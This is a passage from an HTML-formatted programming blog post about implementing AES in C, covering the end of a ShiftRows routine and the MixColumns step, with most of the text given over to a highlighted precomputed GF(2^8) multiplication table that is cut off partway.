</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>MixColumns</h4>

<p>I guess this one is the less trivial one to implement &amp; understand. But basically it is a &ldquo;matrix multiplication&rdquo; (in GF(2<sup>8</sup>) though hence the double-quotes) between 4 bytes of the state (row matrix) against a fixed 4x4 matrix. That gives you 4 new state bytes, so you do that for every double-words of your state.</p>

<p>Now, I kind of cheated for my implementation: instead of implementing the &ldquo;weird&rdquo; multiplication, I figured I could use a pre-computed table instead to avoid all the hassle. Because the fixed matrix has only 3 different values (1, 2 &amp; 3) the final table has a really small memory footprint: 3*0x100 bytes basically (if I&rsquo;m being honest I even stole this table from <a href="https://twitter.com/elvanderb">@elvanderb</a>&rsquo;s <a href="http://pastebin.com/MvXpGZts">crazy white-box generator</a>).</p>

<figure class='code'><figcaption><span>gmul</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">gmul</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xFF</span> <span class="p">},</span>
</span><span class='line'>    <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA8</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE5</span> <span class="p">},</span>
</span><span class='line'>    <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB2</span><span 